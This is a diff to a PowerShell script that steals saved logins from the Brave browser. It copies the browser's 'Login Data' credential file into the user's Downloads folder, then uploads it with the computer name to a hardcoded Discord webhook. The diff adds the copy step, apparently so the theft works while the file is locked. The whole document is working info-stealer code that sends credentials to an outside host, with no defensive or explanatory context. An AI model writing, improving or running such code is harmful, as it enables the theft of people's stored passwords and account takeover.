@@ -1,6 +1,10 @@
 $webhookUrl = "https://discord.com/api/webhooks/1374825778193236008/26E8HcYdvmSp3BaKLu_5O9rC5H_xOD9-Z4Pw_BDH1Ns-5cWZd-7WMTxab29tgK3e8B9E"
-$filePath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
-$fileName = [System.IO.Path]::GetFileName($filePath)
+$originalPath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+$downloadsPath = "$env:USERPROFILE\Downloads"
+$fileName = [System.IO.Path]::GetFileName($originalPath)
+$copiedFilePath = Join-Path -Path $downloadsPath -ChildPath $fileName
+Copy-Item -Path $originalPath -Destination $copiedFilePath -Force
+
 $message = "**Login Data** of Brave Browser in [$env:COMPUTERNAME]"
 $boundary = [System.Guid]::NewGuid().ToString()
 $LF = "`r`n"
@@ -17,7 +21,7 @@ $writer.Write("Content-Disposition: form-data; name=`"file`"; filename=`"$fileNa
 $writer.Write("Content-Type: application/octet-stream$LF$LF")
 $writer.Flush()
 
-$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+$fileBytes = [System.IO.File]::ReadAllBytes($copiedFilePath)
 $body.Write($fileBytes, 0, $fileBytes.Length)
 
 $writer.Write("$LF--$boundary--$LF")
@@ -28,3 +32,6 @@ Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multip
 
 $writer.Dispose()
 $body.Dispose()
+
+# Optional: Clean up the copied file after upload
+# Remove-Item $copiedFilePath -Force
